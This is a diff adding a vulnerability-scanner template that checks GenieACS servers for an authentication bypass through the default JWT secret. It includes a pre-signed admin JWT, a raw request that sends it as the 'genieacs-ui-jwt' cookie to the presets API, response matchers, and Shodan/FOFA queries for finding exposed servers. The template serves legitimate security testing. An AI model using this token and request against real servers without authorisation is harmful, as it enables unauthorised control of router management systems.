@@ -1,0 +1,60 @@
+id: genieacs-default-jwt
+
+info:
+  name: GenieACS - Authentication Bypass (Default JWT Secret)
+  author: DhiyaneshDK,pussycat0x
+  severity: high
+  description: |
+    GenieACS, an Auto Configuration Server (ACS) for TR-069 enabled routers and similar devices, is vulnerable to authentication bypass due to the use of a default JWT secret. During installation, if the default JWT secret "secret" is not changed, an attacker can create a JWT token, sign it, and use this token to log into the GenieACS UI interface. The attack is carried out by setting a cookie named "genieacs-ui-jwt" with its value being the JWT token.
+  reference:
+    - https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738
+  classification:
+    cwe-id: CWE-798
+    cpe: cpe:2.3:a:genieacs:genieacs:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: genieacs
+    product: genieacs
+    shodan-query:
+      - http.html:"genieacs"
+      - http.favicon.hash:-2098066288
+    fofa-query:
+      - body="genieacs"
+      - icon_hash=-2098066288
+  tags: misconfig,jwt,genieacs,default-jwt
+variables:
+  cookie_name: genieacs-ui-jwt
+  default_jwt_secret: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aE1ldGhvZCI6ImxvY2FsIiwiaWF0IjoxNzgyNTc0NDEyfQ.y2JaygP5n4WBYQ_dytgS0qet0b6KvtT31UJWqee4L6c
+
+http:
+  - raw:
+      - |
+        GET /api/presets/?filter=true HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/*
+        Cookie: {{cookie_name}}={{default_jwt_secret}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"provision":'
+          - '"provisionArgs":'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - application/json
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: dsl
+        dsl:
+          - '"JWT Secret 👉 " + cookie_name + "=" + default_jwt_secret'
+# digest: 4a0a0047304502203550363ae11173bb2ac16f95a374e9ea75fe415f402bf4a14051f5ca4523eb30022100e99d9674642c4efd92125505e0009123171bc8af1e081c5125cd84483848e895:922c64590222798bb761d5b6d8e72950
